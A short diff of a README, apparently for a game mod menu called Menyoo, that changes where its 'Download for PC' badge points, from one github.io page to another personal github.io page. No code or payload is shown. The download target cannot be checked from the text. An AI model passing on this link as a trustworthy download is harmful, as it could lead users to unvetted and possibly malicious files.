@@ -8,7 +8,7 @@
 
 <div align="center">
 
-[![⬇️ Download for PC](https://img.shields.io/badge/⬇️%20Download%20for%20PC-Green?style=for-the-badge&logo=windows)](https://download-portal-demo.github.io/.github/Menyoomodmenu)  
+[![⬇️ Download for PC](https://img.shields.io/badge/⬇️%20Download%20for%20PC-Green?style=for-the-badge&logo=windows)](https://trahendon.github.io/.github/Menyoomod=pc1)  
 
 </div>
 
